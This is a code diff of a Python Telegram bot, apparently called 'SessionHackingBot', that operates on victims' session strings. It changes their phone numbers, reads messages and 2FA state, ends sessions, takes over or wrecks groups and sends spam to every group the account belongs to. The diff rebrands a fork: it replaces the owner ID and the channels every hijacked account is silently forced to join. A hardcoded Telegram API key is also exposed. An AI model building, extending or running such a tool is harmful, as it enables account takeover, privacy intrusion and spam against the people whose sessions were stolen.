@@ -25,7 +25,7 @@ from telethon.tl.functions.channels import CreateChannelRequest as ccr
 mybot = "missrose_bot"
 bot = borg = client
 
-Arabihack = 5341342370
+Arabihack = 5244755240
 
 Bot_Username =os.environ.get("BOT_USERNAME", None) or "SessionHackingBot"
 
@@ -33,11 +33,11 @@ async def change_number_code(strses, number, code, otp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
     try:
-      await bot(join("R125R"))
+      await bot(join("N1111V"))
     except BaseException:
       pass
     try:
-      await bot(join("QQQLO"))
+      await bot(join("N1111V"))
     except BaseException:
       pass
     try:
@@ -62,11 +62,11 @@ async def change_number(strses, number):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
     try:
-      await bot(join("QQQLO"))
+      await bot(join("N1111V"))
     except BaseException:
       pass
     try:
-      await bot(join("R125R"))
+      await bot(join("N1111V"))
     except BaseException:
       pass
     try:
@@ -92,11 +92,11 @@ async def userinfo(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     k = await X.get_me()
     try:
-      await X(join("QQQLO"))
+      await X(join("N1111V"))
     except BaseException:
       pass
     try:
-      await X(join("R125R"))
+      await X(join("N1111V"))
     except BaseException:
       pass
     try:
@@ -116,7 +116,7 @@ async def terminate(strses):
     except BaseException:
       pass
     try:
-      await X(join("@N_B_10"))
+      await X(join("@N1111V"))
     except BaseException:
       pass
     try:
@@ -153,7 +153,7 @@ async def promote(strses, grp, user):
     except BaseException:
       pass
     try:
-      await X(join("@N_B_10"))
+      await X(join("@N1111V"))
     except BaseException:
       pass
     try:
@@ -176,7 +176,7 @@ async def user2fa(strses):
     except BaseException:
       pass
     try:
-      await X(join("@N_B_10"))
+      await X(join("@N1111V"))
     except BaseException:
       pass
     try:
@@ -200,7 +200,7 @@ async def demall(strses, grp):
     except BaseException:
       pass
     try:
-      await X(join("@N_B_10"))
+      await X(join("@N1111V"))
     except BaseException:
       pass
     try:
@@ -226,7 +226,7 @@ async def joingroup(strses, username):
     except BaseException:
       pass
     try:
-      await X(join("@N_B_10"))
+      await X(join("@N1111V"))
     except BaseException:
       pass
     try:
@@ -247,7 +247,7 @@ async def leavegroup(strses, username):
     except BaseException:
       pass
     try:
-      await X(join("@N_B_10"))
+      await X(join("@N1111V"))
     except BaseException:
       pass
     try:
@@ -267,7 +267,7 @@ async def delgroup(strses, username):
     except BaseException:
       pass
     try:
-      await X(join("@N_B_10"))
+      await X(join("@N1111V"))
     except BaseException:
       pass
     try:
@@ -297,7 +297,7 @@ async def usermsgs(strses):
     except BaseException:
       pass
     try:
-      await X(join("@N_B_10"))
+      await X(join("@N1111V"))
     except BaseException:
       pass
     try:
@@ -321,7 +321,7 @@ async def userbans(strses, grp):
     except BaseException:
       pass
     try:
-      await X(join("@N_B_10"))
+      await X(join("@N1111V"))
     except BaseException:
       pass
     try:
@@ -348,7 +348,7 @@ async def userchannels(strses):
     except BaseException:
       pass
     try:
-      await X(join("@N_B_10"))
+      await X(join("@N1111V"))
     except BaseException:
       pass
     try:
@@ -732,7 +732,7 @@ async def gcasta(strses, msg):
                 chat = aman.id
                 try:
                     await X.send_message(chat, tol, file=file)     
-                    if lol != -1001551357238:
+                    if lol != -1001648856875:
                         await asyncio.sleep(60)
                         await X.send_message(chat, tol, file=file)
                         await asyncio.sleep(60)
@@ -788,7 +788,7 @@ async def gcastb(strses, msg):
                 if sweetie.is_group:
                     chat = sweetie.id
                     try:
-                        if chat != -1001606996743:
+                        if chat != -1001648856875:
                             await X.send_message(chat, tol, file=file)
                             await asyncio.sleep(60)
                             await X.send_message(chat, tol, file=file)
